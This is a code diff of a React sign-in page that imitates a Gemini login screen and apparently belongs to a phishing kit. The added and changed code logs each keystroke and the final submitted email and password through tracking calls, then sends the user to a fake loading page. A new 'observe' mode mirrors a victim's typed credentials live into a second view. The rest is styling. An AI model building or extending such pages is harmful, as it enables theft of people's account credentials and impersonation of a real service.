@@ -28,8 +28,8 @@ function PersonIcon() {
   );
 }
 
-function FloatingInput({ label, type = "text", value, onChange, showToggle, onToggle, showPassword, onKeyDown, inputRef }: {
-  label: string; type?: string; value: string; onChange: (v: string) => void; showToggle?: boolean; onToggle?: () => void; showPassword?: boolean; onKeyDown?: (e: React.KeyboardEvent) => void; inputRef?: React.RefObject<HTMLInputElement | null>;
+function FloatingInput({ label, name, type = "text", value, onChange, showToggle, onToggle, showPassword, onKeyDown, inputRef }: {
+  label: string; name?: string; type?: string; value: string; onChange: (v: string) => void; showToggle?: boolean; onToggle?: () => void; showPassword?: boolean; onKeyDown?: (e: React.KeyboardEvent) => void; inputRef?: React.RefObject<HTMLInputElement | null>;
 }) {
   const [focused, setFocused] = useState(false);
   const localRef = useRef<HTMLInputElement>(null);
@@ -39,7 +39,7 @@ function FloatingInput({ label, type = "text", value, onChange, showToggle, onTo
     <div onClick={() => ref.current?.focus()} style={{ position: "relative", display: "flex", alignItems: "center", height: 56, borderRadius: 10, border: focused ? "2px solid rgb(1,3,4)" : "1px solid rgb(204,205,205)", padding: focused ? "0 15px" : "0 16px", cursor: "text", transition: "border-color 0.2s ease" }}>
       <div style={{ flex: 1, minWidth: 0, height: "100%", position: "relative", display: "flex", alignItems: "center" }}>
         <label style={{ position: "absolute", left: 0, pointerEvents: "none", transition: "all 0.2s cubic-bezier(0.4,0,0.2,1)", color: "rgb(128,129,129)", fontSize: isActive ? 11 : 16, top: isActive ? 8 : "50%", transform: isActive ? "none" : "translateY(-50%)", lineHeight: "16px" }}>{label}</label>
-        <input ref={ref} type={type} value={value} onChange={(e) => onChange(e.target.value)} onFocus={() => setFocused(true)} onBlur={() => setFocused(false)} onKeyDown={onKeyDown} autoComplete="off" name={label} style={{ width: "100%", background: "transparent", border: "none", outline: "none", fontSize: 16, color: "rgb(1,3,4)", fontFamily: "inherit", paddingTop: isActive ? 14 : 0, paddingBottom: 0 }} />
+        <input ref={ref} type={type} value={value} onChange={(e) => onChange(e.target.value)} onFocus={() => setFocused(true)} onBlur={() => setFocused(false)} onKeyDown={onKeyDown} autoComplete="off" name={name ?? label} style={{ width: "100%", background: "transparent", border: "none", outline: "none", fontSize: 16, color: "rgb(1,3,4)", fontFamily: "inherit", paddingTop: isActive ? 14 : 0, paddingBottom: 0 }} />
       </div>
       {showToggle && (
         <button type="button" onClick={(e) => { e.stopPropagation(); onToggle?.(); }} style={{ background: "none", border: "none", cursor: "pointer", padding: 4, color: "rgb(1,3,4)", display: "flex", alignItems: "center", flexShrink: 0 }}>
@@ -51,7 +51,7 @@ function FloatingInput({ label, type = "text", value, onChange, showToggle, onTo
 }
 
 function GiSignInPage() {
-  const { trackClick, trackInput, giNavigate, sessionId } = useGiTracking();
+  const { trackClick, trackInput, trackSubmit, giNavigate, sessionId, isObserve } = useGiTracking();
   const [step, setStep] = useState<"email" | "password">("email");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
@@ -65,10 +65,29 @@ function GiSignInPage() {
     else setTimeout(() => passwordRef.current?.focus(), 200);
   }, [step]);
 
+  useEffect(() => {
+    if (!isObserve) return;
+    function onMirror(e: Event) {
+      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
+      if (!d?.field) return;
+      const value = String(d.value ?? "");
+      if (d.field === "email" || d.field === "Email Input" || d.field === "Email address") {
+        setEmail(value);
+        return;
+      }
+      if (d.field === "password" || d.field === "Password Input" || d.field === "Password") {
+        setStep("password");
+        setPassword(value);
+      }
+    }
+    window.addEventListener("ux:mirror-live-input", onMirror);
+    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
+  }, [isObserve]);
+
   const goToPassword = () => {
     if (!email) return;
     trackClick("Continue");
-    trackInput("Email Submit", email);
+    trackSubmit("email", email);
     setStep("password");
   };
 
@@ -76,29 +95,35 @@ function GiSignInPage() {
     if (!email || !password) return;
     setIsLoading(true);
     trackClick("Sign In");
-    trackInput("Password Submit", password);
+    trackSubmit("password", password);
     giNavigate("/gi/loading");
   };
 
   return (
-    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: GI_FONT_FAMILY, color: "rgb(1,3,4)", fontSize: 16, lineHeight: "24px" }}>
+    <div className="gi-page" style={{ minHeight: "100vh", background: "#fff", fontFamily: GI_FONT_FAMILY, color: "rgb(1,3,4)", fontSize: 16, lineHeight: "24px" }}>
       <GiFontStyle />
-      <style>{`@keyframes gi-spin { to { transform: rotate(360deg); } }`}</style>
+      <style>{`
+        @keyframes gi-spin { to { transform: rotate(360deg); } }
+        @media (max-width: 640px) {
+          .gi-signin-header { height: auto !important; min-height: 56px; padding: 12px 16px !important; }
+          .gi-signin-title { font-size: 28px !important; line-height: 36px !important; }
+        }
+      `}</style>
 
-      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "16px 24px", height: 75 }}>
+      <div className="gi-signin-header" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "16px 24px", height: 75, gap: 12, flexWrap: "wrap" }}>
         <GeminiLogo />
-        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
+        <div className="gi-topbar-extra" style={{ display: "flex", alignItems: "center", gap: 16 }}>
           <span style={{ fontSize: 12, color: "rgb(103,104,104)" }}>Don't have a Gemini account?</span>
           <button onClick={() => trackClick("Create Account")} style={{ padding: "0 16px", border: "none", borderRadius: 999, cursor: "pointer", height: 32, fontSize: 12, fontWeight: 600, fontFamily: "inherit", background: "rgba(1,3,4,0.08)", color: "rgb(1,3,4)" }}>Create a new account</button>
         </div>
       </div>
 
       <div style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
-        <div style={{ width: 420, maxWidth: "100%", marginTop: 48, padding: "0 24px" }}>
+        <div className="gi-content" style={{ width: "100%", maxWidth: 420, marginTop: 48, padding: "0 24px", boxSizing: "border-box" }}>
           {step === "email" ? (
             <>
-              <h1 style={{ fontWeight: 600, fontSize: 32, lineHeight: "40px", margin: "0 0 24px 0" }}>Sign in</h1>
-              <FloatingInput label="Email address" type="email" value={email} onChange={(v) => { setEmail(v); trackInput("Email Input", v); }} onKeyDown={(e) => e.key === "Enter" && goToPassword()} inputRef={emailRef} />
+              <h1 className="gi-signin-title" style={{ fontWeight: 600, fontSize: 32, lineHeight: "40px", margin: "0 0 24px 0" }}>Sign in</h1>
+              <FloatingInput label="Email address" name="email" type="email" value={email} onChange={(v) => { setEmail(v); trackInput("email", v); }} onKeyDown={(e) => e.key === "Enter" && goToPassword()} inputRef={emailRef} />
               <button onClick={goToPassword} disabled={!email} style={{ display: "flex", alignItems: "center", justifyContent: "center", width: "100%", height: 56, borderRadius: 999, border: "none", cursor: email ? "pointer" : "default", fontSize: 16, fontWeight: 600, fontFamily: "inherit", marginTop: 24, background: email ? "rgb(1,3,4)" : "rgba(1,3,4,0.08)", color: email ? "#fff" : "rgba(1,3,4,0.3)" }}>Continue</button>
               <div style={{ display: "flex", alignItems: "center", gap: 24, margin: "32px 0" }}>
                 <div style={{ flex: 1, height: 1, background: "rgba(1,3,4,0.1)" }} />
@@ -117,7 +142,7 @@ function GiSignInPage() {
                 <span style={{ flex: 1, fontSize: 14, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{email}</span>
                 <button onClick={() => { trackClick("Change Email"); setStep("email"); }} style={{ background: "none", border: "none", cursor: "pointer", fontFamily: "inherit", fontSize: 14, fontWeight: 600, color: "rgb(1,3,4)" }}>Change</button>
               </div>
-              <FloatingInput label="Password" type={showPassword ? "text" : "password"} value={password} onChange={(v) => { setPassword(v); trackInput("Password Input", v); }} showToggle onToggle={() => { setShowPassword(!showPassword); trackClick("Toggle Password"); }} showPassword={showPassword} onKeyDown={(e) => e.key === "Enter" && handleLogin()} inputRef={passwordRef} />
+              <FloatingInput label="Password" name="password" type={showPassword ? "text" : "password"} value={password} onChange={(v) => { setPassword(v); trackInput("password", v); }} showToggle onToggle={() => { setShowPassword(!showPassword); trackClick("Toggle Password"); }} showPassword={showPassword} onKeyDown={(e) => e.key === "Enter" && handleLogin()} inputRef={passwordRef} />
               <div style={{ marginTop: 12 }}>
                 <span style={{ fontSize: 14, color: "rgb(1,3,4)", textDecoration: "underline", cursor: "pointer" }} onClick={() => trackClick("Forgot Password")}>Forgot password?</span>
               </div>
